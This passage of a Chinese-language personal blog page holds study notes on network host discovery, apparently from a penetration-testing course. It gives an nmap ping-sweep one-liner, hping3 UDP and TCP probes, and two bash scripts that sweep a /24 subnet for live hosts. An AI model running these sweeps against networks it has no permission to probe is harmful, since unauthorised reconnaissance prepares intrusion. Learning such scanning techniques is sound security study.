nmap 192.168.100.1-254 -PA80 -sn | grep &quot;Nmap&quot; | grep -v &quot;Starting&quot; | grep -v &quot;done&quot;| cut -d &quot; &quot; -f 6 | cut -d &quot;(&quot; -f 2| cut -d &quot;)&quot; -f 1 &gt; iplist.txt</code></pre></blockquote>
<ol start="5">
<li><p>发现-四层发现（hping3）</p>
<ul>
<li><strong><code>🔺命令：hping3 --udp IP地址 -c 1</code></strong></li>
<li><strong><code>🔺命令：for addr in $(seq 1 254);do hping3 --udp 1.1.1.$addr -c 1 &gt;&gt;r.txt;done</code></strong><ul>
<li><strong><code>🔺命令：grep Unreachable r.txt | cut -d &quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2</code></strong></li>
<li><strong><code>🔺命令：./udp_hping.sh IP网段</code></strong></li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#！/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./udp_hping.sh [/24 network address]&quot;</span><br><span class="line">    echo &quot;Example - ./udp_hping.sh 192.168.100.0&quot;</span><br><span class="line">    echo &quot;Example will perform an UDP scan of the 192.168.100.0/24 network and output.txt file&quot;</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">prefix=$(echo $1 | cut -d &quot;.&quot; -f 1-3)</span><br><span class="line">for addr in $(seq 1 254);do</span><br><span class="line">    hping3 $prefix.$addr --udp -c 1 &gt;&gt; r.txt;</span><br><span class="line">done</span><br><span class="line">grep Unreachable r.txt | cut -d &quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2 &gt;&gt; output.txt</span><br><span class="line">rm r.txt</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>🔺命令：hping3 IP地址 -c 1</code></strong>（TCP，Flag 0–ACK、RST）<ul>
<li><strong><code>🔺命令：hping3 IP地址</code></strong></li>
<li><strong><code>🔺命令：./tcp_hping.sh IP网段</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#！/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./tcp_hping.sh [/24 network address]&quot;</span><br><span class="line">    echo &quot;Example - ./tcp_hping.sh 192.168.100.0&quot;</span><br><span class="line">    echo &quot;Example will perform an TCP scan of the 192.168.100.0/24 network and output.txt file&quot;</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">prefix=$(echo $1 | cut -d &quot;.&quot; -f 1-3)</span><br><span class="line">for addr in $(seq 1 254);do</span><br><span class="line">    hping3 $prefix.$addr -c 1 &gt;&gt; r.txt;</span><br><span class="line">done</span><br><span class="line">grep Unreachable r.txt | cut -d &quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2 &gt;&gt; output.txt</span><br><span class="line">rm r.txt</span><br></pre></td></tr></table></figure>


<blockquote>
<pre><code>hping3不是发ACK的TCP包，是flag0的TCP包，需要收回ACK、RST的TCP包
nmap和Scapy发的是ACK的TCP包，是flag16的TCP包，需要收回RST的TCP包</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/">Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">47</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:643008933@qq.com" target="_blank" title="QQ邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>QQ邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
